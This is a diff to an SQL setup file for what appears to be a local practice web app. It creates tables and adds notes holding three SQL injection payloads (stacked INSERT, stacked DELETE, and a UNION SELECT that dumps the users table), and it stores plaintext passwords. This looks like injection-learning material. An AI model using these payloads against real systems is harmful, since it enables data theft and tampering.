@@ -9,4 +9,23 @@ CREATE TABLE users(
 	password varchar(255) NOT NULL
 );
 INSERT INTO users 
-VALUES ('lnwza007', '123'), ('eiei123','123')
+VALUES ('lnwza007', '123'), ('eiei123','123');
+
+CREATE TABLE service(
+    name varchar(255) NOT NULL PRIMARY KEY,
+    price int(11) UNSIGNED NOT NULL
+);
+
+INSERT INTO service
+VALUES ('A', 100), ('B',200), ('C',300), ('D',400);
+
+/////////////////////////////////////////////////////
+
+inject insert
+A"; INSERT INTO service VALUES ("E", 500); -- A
+
+inject delete
+A"; DELETE FROM service WHERE name="E"; -- A
+
+inject union
+http://localhost:3000/service?name=A" UNION SELECT * FROM users; -- A
